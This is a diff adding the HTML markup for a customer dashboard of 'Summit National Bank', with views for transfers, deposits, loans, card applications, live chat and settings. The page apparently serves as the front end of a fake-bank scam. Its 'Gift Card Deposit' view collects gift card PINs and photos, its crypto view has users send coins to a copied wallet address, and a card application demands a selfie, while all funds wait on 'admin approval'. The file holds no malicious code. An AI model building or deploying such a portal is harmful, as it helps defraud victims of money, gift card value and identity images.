@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>My Account — Summit National Bank</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="portal.css" />
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%230a1f44'/><text x='50' y='68' font-size='54' font-family='Georgia' font-weight='bold' text-anchor='middle' fill='%23c8a24a'>S</text></svg>" />
+</head>
+<body>
+<div class="dash-app">
+  <!-- Sidebar -->
+  <aside class="dash-sidebar" id="sidebar">
+    <a href="/login" class="brand-link" title="Back to Summit National Bank home">
+      <div class="brand">
+        <div class="mark">S</div>
+        <div><div class="nm">Summit</div><div class="sub">Online Banking</div></div>
+      </div>
+    </a>
+    <nav class="dash-nav">
+      <div class="nav-label">Account</div>
+      <div class="dnav-item active" data-view="overview"><span class="ic">▦</span> Overview</div>
+      <div class="dnav-item" data-view="accounts"><span class="ic">💳</span> My Accounts</div>
+      <div class="dnav-item" data-view="cards"><span class="ic">📇</span> Credit Cards</div>
+      <div class="dnav-item" data-view="transactions"><span class="ic">⇄</span> Transactions</div>
+      <div class="nav-label">Apply</div>
+      <div class="dnav-item" data-view="transfer"><span class="ic">📤</span> Transfer / Pay</div>
+      <div class="dnav-item" data-view="deposit"><span class="ic">📥</span> Deposit</div>
+      <div class="dnav-item" data-view="crypto"><span class="ic">₿</span> Crypto Deposit</div>
+      <div class="dnav-item" data-view="giftcard"><span class="ic">🎁</span> Gift Card Deposit</div>
+      <div class="dnav-item" data-view="loan"><span class="ic">🏦</span> Apply for Loan</div>
+      <div class="dnav-item" data-view="cardapp"><span class="ic">➕</span> Apply for Card</div>
+      <div class="nav-label">Support</div>
+      <div class="dnav-item" data-view="chat"><span class="ic">💬</span> Live Chat<span class="nav-badge-chat" id="chatBadgeCust" style="display:none"></span></div>
+      <div class="nav-label">Account</div>
+      <div class="dnav-item" data-view="settings"><span class="ic">⚙️</span> Settings</div>
+    </nav>
+    <div class="foot">
+      <div class="user">
+        <div class="av" id="userAv">AM</div>
+        <div><div class="un" id="userName">—</div><div class="ue" id="userEmail">—</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- Main -->
+  <div class="dash-main">
+    <div class="dash-topbar">
+      <div class="tl">
+        <button class="menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+        <h1 id="pageTitle">Overview</h1>
+      </div>
+      <div class="tr">
+        <button class="icon-btn" title="Notifications"><span>🔔</span><span class="ping" id="notifPing" style="display:none"></span></button>
+        <button class="btn btn-ghost btn-sm" onclick="logout()">Sign out</button>
+      </div>
+    </div>
+
+    <div class="dash-content">
+
+      <!-- ============ OVERVIEW ============ -->
+      <section class="view active" id="view-overview">
+        <div class="view-head">
+          <div><h2 id="greeting">Welcome back</h2><p id="greetingSub">Here's a summary of your accounts.</p></div>
+        </div>
+        <div id="pendingBanners"></div>
+        <div class="acct-grid" id="overviewAccounts"></div>
+        <div class="panel">
+          <div class="panel-head"><h3>Recent Transactions</h3><a href="#" onclick="go('transactions');return false" style="font-size:13px;color:var(--blue-500);font-weight:600">View all →</a></div>
+          <div class="table-wrap"><table><thead><tr><th>Description</th><th>Type</th><th>Date</th><th style="text-align:right">Amount</th></tr></thead><tbody id="overviewTxns"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- ============ ACCOUNTS ============ -->
+      <section class="view" id="view-accounts">
+        <div class="view-head"><div><h2>My Accounts</h2><p>All your Summit National Bank accounts.</p></div></div>
+        <div class="acct-grid" id="accountsGrid"></div>
+      </section>
+
+      <!-- ============ CREDIT CARDS ============ -->
+      <section class="view" id="view-cards">
+        <div class="view-head"><div><h2>Credit Cards</h2><p>Your active credit cards, limits, and security deposit requirements.</p></div><button class="btn btn-blue btn-sm" onclick="go('cardapp')">+ Apply for new card</button></div>
+        <div id="cardsDepositSummary"></div>
+        <div id="cardsContainer"></div>
+      </section>
+
+      <!-- ============ TRANSACTIONS ============ -->
+      <section class="view" id="view-transactions">
+        <div class="view-head"><div><h2>Transaction History</h2><p>All your processed transactions.</p></div></div>
+        <div class="panel">
+          <div class="panel-head"><h3>Completed Transactions</h3></div>
+          <div class="table-wrap"><table><thead><tr><th>Description</th><th>Type</th><th>Reference</th><th>Date</th><th style="text-align:right">Amount</th></tr></thead><tbody id="txnsTable"></tbody></table></div>
+        </div>
+        <div class="panel" id="pendingTxnsPanel" style="display:none">
+          <div class="panel-head"><h3>Pending (Awaiting Admin Approval)</h3></div>
+          <div class="table-wrap"><table><thead><tr><th>Type</th><th>Recipient</th><th>Reference</th><th>Amount</th><th>Status</th></tr></thead><tbody id="pendingTxnsTable"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- ============ TRANSFER / PAY ============ -->
+      <section class="view" id="view-transfer">
+        <div class="view-head"><div><h2>Transfer & Pay</h2><p>Send money or pay bills. All transfers require admin approval before processing.</p></div></div>
+        <div class="panel" style="max-width:560px">
+          <div class="panel-head"><h3>New Transfer</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="transferErr"></div>
+            <div class="form-field">
+              <label>From account</label>
+              <select id="transferFrom"></select>
+            </div>
+            <div class="form-field">
+              <label>Transfer type</label>
+              <select id="transferType">
+                <option value="Wire Transfer">Wire Transfer</option>
+                <option value="ACH Transfer">ACH Transfer</option>
+                <option value="External Transfer">External Transfer</option>
+                <option value="Bill Pay">Bill Pay</option>
+                <option value="Internal Transfer">Internal Transfer (between my accounts)</option>
+              </select>
+            </div>
+            <div class="form-field">
+              <label>Recipient / Payee</label>
+              <input type="text" id="transferRecipient" placeholder="e.g. John Smith, or ConEdison Electric" />
+            </div>
+            <div class="form-field">
+              <label>Amount (USD)</label>
+              <input type="number" id="transferAmount" placeholder="0.00" min="0" step="0.01" />
+            </div>
+            <div class="form-field">
+              <label>Reference / Memo (optional)</label>
+              <input type="text" id="transferRef" placeholder="e.g. Rent March" />
+            </div>
+            <button class="btn btn-navy btn-block btn-lg" onclick="submitTransfer()">Submit for approval →</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ DEPOSIT ============ -->
+      <section class="view" id="view-deposit">
+        <div class="view-head"><div><h2>Make a Deposit</h2><p>Request a deposit into your account. All deposits require admin approval before being credited.</p></div></div>
+        <div class="panel" style="max-width:560px">
+          <div class="panel-head"><h3>New Deposit Request</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="depositErr"></div>
+            <div class="form-field">
+              <label>To account</label>
+              <select id="depositTo"></select>
+            </div>
+            <div class="form-field">
+              <label>Deposit type</label>
+              <select id="depositType">
+                <option value="ACH Transfer">ACH Transfer</option>
+                <option value="Wire Transfer">Wire Transfer</option>
+                <option value="Mobile Check Deposit">Mobile Check Deposit</option>
+                <option value="Cash Deposit">Cash Deposit (at branch)</option>
+              </select>
+            </div>
+            <div class="form-field">
+              <label>Amount (USD)</label>
+              <input type="number" id="depositAmount" placeholder="0.00" min="0" step="0.01" />
+            </div>
+            <div class="form-field">
+              <label>Source / Description</label>
+              <input type="text" id="depositSource" placeholder="e.g. Payroll, Check #1234, External bank" />
+            </div>
+            <button class="btn btn-success btn-block btn-lg" onclick="submitDepositRequest()">Submit for approval →</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ LOAN APPLICATION ============ -->
+      <section class="view" id="view-loan">
+        <div class="view-head"><div><h2>Apply for a Loan</h2><p>Submit a loan application for admin review. If approved, funds are disbursed to your checking account.</p></div></div>
+        <div class="panel" style="max-width:560px">
+          <div class="panel-head"><h3>Loan Application</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="loanErr"></div>
+            <div class="form-field">
+              <label>Loan type</label>
+              <select id="loanType">
+                <option value="Home Mortgage">Home Mortgage</option>
+                <option value="Auto Loan">Auto Loan</option>
+                <option value="Personal Loan">Personal Loan</option>
+                <option value="Home Equity Loan">Home Equity Loan</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="form-field">
+                <label>Loan amount</label>
+                <input type="number" id="loanAmount" placeholder="50000" min="0" step="100" />
+              </div>
+              <div class="form-field">
+                <label>Term (years)</label>
+                <select id="loanTerm">
+                  <option value="5">5 years</option><option value="10">10 years</option>
+                  <option value="15">15 years</option><option value="30" selected>30 years</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="form-field">
+                <label>Annual income</label>
+                <input type="number" id="loanIncome" placeholder="80000" min="0" step="1000" />
+              </div>
+              <div class="form-field">
+                <label>Credit score (self-reported)</label>
+                <input type="number" id="loanScore" placeholder="720" min="300" max="850" />
+              </div>
+            </div>
+            <div class="form-field">
+              <label>Purpose of loan</label>
+              <textarea id="loanPurpose" rows="2" placeholder="e.g. Purchase a primary residence, refinance existing mortgage, home renovation..."></textarea>
+            </div>
+            <button class="btn btn-blue btn-block btn-lg" onclick="submitLoanApp()">Submit application →</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CREDIT CARD APPLICATION ============ -->
+      <section class="view" id="view-cardapp">
+        <div class="view-head"><div><h2>Apply for a Credit Card</h2><p>Submit a credit card application for admin review.</p></div></div>
+        <div class="panel" style="max-width:560px">
+          <div class="panel-head"><h3>Credit Card Application</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="cardErr"></div>
+            <div class="form-field">
+              <label>Card type</label>
+              <select id="cardTypeApp">
+                <option value="Summit Platinum Rewards">Summit Platinum Rewards</option>
+                <option value="Summit Cash Back">Summit Cash Back</option>
+                <option value="Summit Travel Elite">Summit Travel Elite</option>
+                <option value="Summit Secured Card">Summit Secured Card (building credit)</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <div class="form-field">
+                <label>Requested credit limit</label>
+                <input type="number" id="cardLimit" placeholder="10000" min="500" step="500" />
+              </div>
+              <div class="form-field">
+                <label>Annual income</label>
+                <input type="number" id="cardIncome" placeholder="80000" min="0" step="1000" />
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="form-field">
+                <label>Credit score (self-reported)</label>
+                <input type="number" id="cardScore" placeholder="720" min="300" max="850" />
+              </div>
+              <div class="form-field">
+                <label>Existing debt (optional)</label>
+                <input type="number" id="cardDebt" placeholder="5000" min="0" step="100" />
+              </div>
+            </div>
+            <div class="form-field">
+              <label>Identity verification — take a selfie</label>
+              <p style="font-size:12px;color:var(--gray-500);margin:-4px 0 10px">A clear photo of your face is required to verify your identity for this credit card application.</p>
+              <div class="selfie-box" id="cardSelfieBox">
+                <div class="selfie-placeholder" id="cardSelfiePlaceholder">
+                  <span style="font-size:30px">📷</span>
+                  <span>Click to take a selfie</span>
+                </div>
+                <video id="cardSelfieVideo" autoplay playsinline style="display:none;width:100%;border-radius:10px"></video>
+                <img id="cardSelfieImg" style="display:none;width:100%;border-radius:10px" alt="selfie" />
+              </div>
+              <div class="selfie-controls" id="cardSelfieControls" style="display:none">
+                <button type="button" class="btn btn-blue btn-sm" id="cardSnapBtn">📸 Capture</button>
+                <button type="button" class="btn btn-sm" id="cardRetakeBtn">Retake</button>
+                <label class="btn btn-sm" style="cursor:pointer">Upload photo<input type="file" accept="image/*" id="cardSelfieFile" style="display:none" onchange="handleCardSelfieUpload(event)"></label>
+              </div>
+              <div class="selfie-controls" id="cardSelfieStart" style="display:flex;gap:8px;margin-top:10px">
+                <button type="button" class="btn btn-blue btn-sm" onclick="startCardSelfie()">📷 Take selfie</button>
+                <label class="btn btn-sm" style="cursor:pointer">Upload photo<input type="file" accept="image/*" style="display:none" onchange="handleCardSelfieUpload(event)"></label>
+              </div>
+            </div>
+            <button class="btn btn-blue btn-block btn-lg" onclick="submitCardApp()">Submit application →</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ CRYPTO DEPOSIT ============ -->
+      <section class="view" id="view-crypto">
+        <div class="view-head"><div><h2>Cryptocurrency Deposit</h2><p>Deposit crypto into your Summit account. Select a coin, copy our wallet address, send your funds, then submit the transaction hash for confirmation.</p></div></div>
+        <div class="panel" style="max-width:640px">
+          <div class="panel-head"><h3>Deposit Crypto</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="cryptoErr"></div>
+            <div class="form-field">
+              <label>Select cryptocurrency</label>
+              <select id="cryptoCoin"></select>
+            </div>
+            <div class="form-field">
+              <label>Network</label>
+              <input type="text" id="cryptoNetwork" readonly style="background:var(--gray-50)" />
+            </div>
+            <div class="form-field">
+              <label>Deposit wallet address</label>
+              <div style="display:flex;gap:10px;align-items:stretch">
+                <input type="text" id="cryptoWallet" readonly style="background:var(--gray-50);font-family:monospace;font-size:13px" />
+                <button class="btn btn-navy" style="white-space:nowrap" onclick="copyWallet()">Copy</button>
+              </div>
+              <div class="hint">Send only the selected coin to this address. Sending other coins may result in permanent loss.</div>
+            </div>
+            <div class="form-field">
+              <label>Amount sent (in USD value)</label>
+              <input type="number" id="cryptoAmount" placeholder="0.00" min="0" step="0.01" />
+              <div class="hint">Enter the USD equivalent of the crypto you sent.</div>
+            </div>
+            <div class="form-field">
+              <label>Credit to account</label>
+              <select id="cryptoToAccount"></select>
+            </div>
+            <div class="form-field">
+              <label>Transaction hash / TXID (optional but recommended)</label>
+              <input type="text" id="cryptoHash" placeholder="Paste your blockchain transaction hash" style="font-family:monospace;font-size:13px" />
+            </div>
+            <button class="btn btn-navy btn-block btn-lg" onclick="submitCryptoDeposit()">Submit deposit for confirmation →</button>
+          </div>
+        </div>
+        <div id="cryptoPendingWrap" style="display:none">
+          <div class="panel">
+            <div class="panel-head"><h3>Pending Crypto Deposits</h3></div>
+            <div class="table-wrap"><table><thead><tr><th>Coin</th><th>Amount (USD)</th><th>Hash</th><th>Status</th></tr></thead><tbody id="cryptoPending"></tbody></table></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ GIFT CARD DEPOSIT ============ -->
+      <section class="view" id="view-giftcard">
+        <div class="view-head"><div><h2>Gift Card Deposit</h2><p>Redeem your gift cards into your Summit account. Enter the card details, pins, and upload clear photos of the card(s). Our team will verify and credit your account.</p></div></div>
+        <div class="panel" style="max-width:640px">
+          <div class="panel-head"><h3>Redeem Gift Card</h3></div>
+          <div style="padding:24px">
+            <div class="form-error" id="giftErr"></div>
+            <div class="form-row">
+              <div class="form-field">
+                <label>Gift card brand</label>
+                <select id="giftBrand">
+                  <option value="Amazon">Amazon</option>
+                  <option value="Apple/iTunes">Apple / iTunes</option>
+                  <option value="Google Play">Google Play</option>
+                  <option value="Steam">Steam</option>
+                  <option value="Visa Prepaid">Visa Prepaid</option>
+                  <option value="Mastercard Prepaid">Mastercard Prepaid</option>
+                  <option value="Walmart">Walmart</option>
+                  <option value="Target">Target</option>
+                  <option value="Starbucks">Starbucks</option>
+                  <option value="Best Buy">Best Buy</option>
+                  <option value="Vanilla Visa">Vanilla Visa</option>
+                  <option value="Other">Other</option>
+                </select>
+              </div>
+              <div class="form-field">
+                <label>Card value (USD)</label>
+                <input type="number" id="giftValue" placeholder="100.00" min="0" step="0.01" />
+              </div>
+            </div>
+            <div class="form-field">
+              <label>Credit to account</label>
+              <select id="giftToAccount"></select>
+            </div>
+            <div class="form-field">
+              <label>Card PIN(s) — one per line</label>
+              <textarea id="giftPins" rows="3" placeholder="Enter each pin/claim code on a new line&#10;e.g.&#10;X8F4-9K2L-7M3P&#10;A1B2-C3D4-E5F6"></textarea>
+              <div class="hint">If your card has no pin, enter the claim/redeem code instead.</div>
+            </div>
+            <div class="form-field">
+              <label>Upload gift card image(s)</label>
+              <div id="giftDrop" class="gift-drop">
+                <div class="gift-drop-inner">
+                  <div class="gdi-ic">📷</div>
+                  <div>Click to upload or drag & drop gift card photos</div>
+                  <div class="hint">JPG / PNG — clear photos of front & back. Multiple files allowed.</div>
+                </div>
+                <input type="file" id="giftFiles" accept="image/*" multiple style="display:none" />
+              </div>
+              <div id="giftPreviews" class="gift-previews"></div>
+            </div>
+            <button class="btn btn-blue btn-block btn-lg" onclick="submitGiftCard()">Submit gift card for redemption →</button>
+          </div>
+        </div>
+        <div id="giftPendingWrap" style="display:none">
+          <div class="panel">
+            <div class="panel-head"><h3>Pending Gift Card Deposits</h3></div>
+            <div class="table-wrap"><table><thead><tr><th>Brand</th><th>Value</th><th>Pins</th><th>Images</th><th>Status</th></tr></thead><tbody id="giftPending"></tbody></table></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ LIVE CHAT ============ -->
+      <section class="view" id="view-chat">
+        <div class="view-head"><div><h2>Live Chat Support</h2><p>Send a message to our support team. We'll respond as soon as possible — your conversation is saved to your account.</p></div></div>
+        <div class="panel chat-panel">
+          <div class="chat-header">
+            <div class="chat-agent">
+              <div class="chat-agent-av">S</div>
+              <div><div class="chat-agent-name">Summit Support</div><div class="chat-agent-status"><span class="chat-dot"></span> Online · typically replies within minutes</div></div>
+            </div>
+          </div>
+          <div class="chat-body" id="chatBody"></div>
+          <div class="chat-input-wrap">
+            <textarea id="chatInput" rows="1" placeholder="Type your message…" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChat()}"></textarea>
+            <button class="btn btn-navy" onclick="sendChat()">Send</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ SETTINGS ============ -->
+      <section class="view" id="view-settings">
+        <div class="view-head"><div><h2>Settings</h2><p>Manage your account preferences and security.</p></div></div>
+        <div style="display:grid;gap:20px;max-width:640px">
+          <div class="panel">
+            <div class="panel-head"><h3>Profile</h3></div>
+            <div style="padding:24px" id="settingsProfile"></div>
+          </div>
+          <div class="panel">
+            <div class="panel-head"><h3>Change Email Address</h3></div>
+            <div style="padding:24px">
+              <div class="form-error" id="emailErr"></div>
+              <div class="form-field">
+                <label>Current email</label>
+                <input type="email" id="setCurEmail" readonly style="background:var(--gray-50)" />
+              </div>
+              <div class="form-field">
+                <label>New email address</label>
+                <input type="email" id="setNewEmail" placeholder="new.email@email.com" />
+              </div>
+              <div class="form-field">
+                <label>Confirm with password</label>
+                <input type="password" id="setEmailPass" placeholder="Enter your password" />
+              </div>
+              <button class="btn btn-blue" onclick="changeEmail()">Update email</button>
+            </div>
+          </div>
+          <div class="panel">
+            <div class="panel-head"><h3>Change Password</h3></div>
+            <div style="padding:24px">
+              <div class="form-error" id="passErr"></div>
+              <div class="form-field">
+                <label>Current password</label>
+                <input type="password" id="setCurPass" placeholder="Enter current password" />
+              </div>
+              <div class="form-field">
+                <label>New password</label>
+                <input type="password" id="setNewPass" placeholder="At least 6 characters" />
+              </div>
+              <div class="form-field">
+                <label>Confirm new password</label>
+                <input type="password" id="setNewPass2" placeholder="Re-enter new password" />
+              </div>
+              <button class="btn btn-navy" onclick="changePassword()">Update password</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </div>
+</div>
+
+<!-- Modal for receipts / confirmations -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <div class="modal-head"><h3 id="modalTitle">Submitted</h3><button class="close" onclick="closeModal()">✕</button></div>
+    <div class="modal-body" id="modalBody"></div>
+    <div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>
+  </div>
+</div>
+
+<div class="toast-wrap" id="toastWrap"></div>
+
+<script src="api-client.js"></script>
+<script src="portal.js"></script>
+</body>
+</html>
